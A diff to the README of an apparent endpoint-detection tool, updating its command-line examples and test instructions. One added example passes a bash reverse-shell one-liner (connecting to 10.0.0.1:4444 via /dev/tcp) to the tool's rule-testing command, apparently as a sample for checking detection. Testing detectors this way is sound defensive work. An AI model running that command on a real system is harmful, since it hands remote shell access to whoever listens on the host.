@@ -283,7 +283,7 @@ All `/api/v1/*` routes require a dashboard session or the agent key, except wher
 python3 tools/sentinelctl.py status
 python3 tools/sentinelctl.py rules validate --file /etc/sentinel/rules.yaml
 python3 tools/sentinelctl.py lineage list
-python3 tools/sentinelctl.py test rule
+python3 tools/sentinelctl.py test rule --command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
 python3 tools/sentinelctl.py maintenance backup
 ```
 
@@ -315,7 +315,8 @@ Run `sentinelctl.py --help` for the full command set.
 ```bash
 make test                          # lineage logic tests
 python3 tests/test_auth_db.py      # auth, sessions, allowlist, SQLite
-make verify                        # clang syntax check of both eBPF sources
+make verify                        # clang syntax check of the eBPF source
+sudo make kernel-test              # load the object on this kernel: verifier, lineage, argv capture, blocking
 make package                       # dist/sentinel-lineage-edr-<version>.tar.gz
 ```
 
